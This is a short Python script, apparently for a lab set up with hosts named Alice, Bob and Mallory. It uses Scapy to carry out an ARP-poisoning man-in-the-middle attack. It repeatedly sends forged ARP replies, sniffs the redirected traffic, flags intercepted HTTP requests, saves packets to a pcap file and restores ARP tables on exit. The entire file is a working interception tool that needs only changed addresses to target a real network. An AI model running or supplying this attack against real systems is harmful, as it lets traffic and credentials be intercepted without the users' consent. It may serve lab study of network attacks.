from scapy.all import ARP, send, AsyncSniffer, Packet, IP, TCP, wrpcap
import time
import os

ALICE_IP = '172.31.0.2'
ALICE_MAC = '02:42:ac:1f:00:02'
BOB_IP = '172.31.0.3'
BOB_MAC = '02:42:ac:1f:00:03'
MALLORY_MAC = '02:42:ac:1f:00:04'

captured_packets = []

def process_packet(pkt: Packet):
    captured_packets.append(pkt)
    if pkt.haslayer(TCP) and pkt[TCP].dport == 80:
        print(f"\n[!!!] SCAPY MITM SUCCESS [!!!]")
        print(f"[*] Intercepted HTTP Request: {pkt[IP].src} -> {pkt[IP].dst}")
        # Save immediately on success to be safe
        wrpcap("/data/evidence.pcap", captured_packets)

def clean():
    print("\n[+] Final save of evidence...")
    wrpcap("/data/evidence.pcap", captured_packets)
    print("[+] Restoring ARP tables...")
    send(ARP(op='is-at', pdst=ALICE_IP, psrc=BOB_IP, hwsrc=BOB_MAC, hwdst=ALICE_MAC), count=5, verbose=False)
    send(ARP(op='is-at', pdst=BOB_IP, psrc=ALICE_IP, hwsrc=ALICE_MAC, hwdst=BOB_MAC), count=5, verbose=False)

def main():
    sniffer = AsyncSniffer(iface='eth0', prn=process_packet, store=False)
    try:
        sniffer.start()
        print(f"--- ARP POISONING & CAPTURE ACTIVE ---")
        while True:
            send(ARP(op='is-at', pdst=ALICE_IP, psrc=BOB_IP, hwsrc=MALLORY_MAC, hwdst=ALICE_MAC), verbose=False)
            send(ARP(op='is-at', pdst=BOB_IP, psrc=ALICE_IP, hwsrc=MALLORY_MAC, hwdst=BOB_MAC), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        sniffer.stop()
        clean()

if __name__ == '__main__':
    main()
